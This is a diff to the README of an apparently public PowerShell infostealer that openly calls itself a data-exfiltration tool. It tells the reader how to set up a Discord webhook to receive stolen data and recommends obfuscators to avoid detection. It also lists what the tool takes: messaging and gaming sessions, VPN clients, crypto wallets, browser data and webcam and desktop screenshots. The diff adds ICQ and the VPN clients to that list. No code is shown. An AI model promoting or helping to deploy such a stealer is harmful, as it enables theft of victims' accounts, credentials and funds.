@@ -30,7 +30,7 @@ This tool is made for data exfiltration. All information collected is sent using
 - After creating a server go to ```Edit channel``` > ```Integrations``` > ```Webhooks``` > ```Create Webhook```
 - Copy the ```Webhook URL```
 - Download ```main.ps1``` 
-- Open ```main.ps1``` and replace ```YOUR_WEBHOOK_HERE``` in line ```754``` with your webhook or use the [builder](https://github.com/KDot227/Powershell-Token-Grabber/blob/main/builder.ps1).
+- Open ```main.ps1``` and replace ```YOUR_WEBHOOK_HERE``` in line ```827``` with your webhook or use the [builder](https://github.com/KDot227/Powershell-Token-Grabber/blob/main/builder.ps1).
 
 # Want to obfuscate the code ?
 Use [Invoke-Obfuscation](https://github.com/danielbohannon/Invoke-Obfuscation). \
@@ -62,17 +62,22 @@ Or use [Somalifuscator](https://github.com/kdot227/somalifuscator) for .bat file
 - [x] 📷 Webcam & Desktop Screenshots
 - [x] Session Stealers 
   > ### Messaging
-  - [Telegram](https://telegram.org) 
-  - [Element](https://element.io) 
-  - [Signal](https://signal.org) 
-  - [Viber](https://viber.com) 
-  - [WhatsApp](https://whatsapp.com) 
+    - [Element](https://element.io) 
+    - [ICQ](https://icq.com)
+    - [Signal](https://signal.org) 
+    - [Telegram](https://telegram.org) 
+    - [Viber](https://viber.com) 
+    - [WhatsApp](https://whatsapp.com) 
   > ### Gaming 
-  - [Steam](https://store.steampowered.com)
-  - [Minecraft](https://minecraft.net)
-  - [Epicgames](https://store.epicgames.com)
-  - [Ubisoft](https://ubisoftconnect.com)
-  - [Electronic Arts](https://ea.com)
+    - [Electronic Arts](https://ea.com)
+    - [Epicgames](https://store.epicgames.com)
+    - [Minecraft](https://minecraft.net)
+    - [Ubisoft](https://ubisoftconnect.com)
+    - [Steam](https://store.steampowered.com)
+- [x] VPN Clients
+    - [Nord](https://nordvpn.com) 
+    - [Proton](https://protonvpn.com)
+    - [Surfshark](https://surfshark.com)
 - [x] Crypto Wallets 
    > Armory | Atomic | Bitcoin | Bytecoin | Coinomi | Dash | Electrum | Ethereum | Exodus | Guarda | Jaxx | Litecoin | Monero | Zcash
 - [x] Browsers (Brave, Chrome, Firefox, Microsoft Edge, Thunderbird etc.)
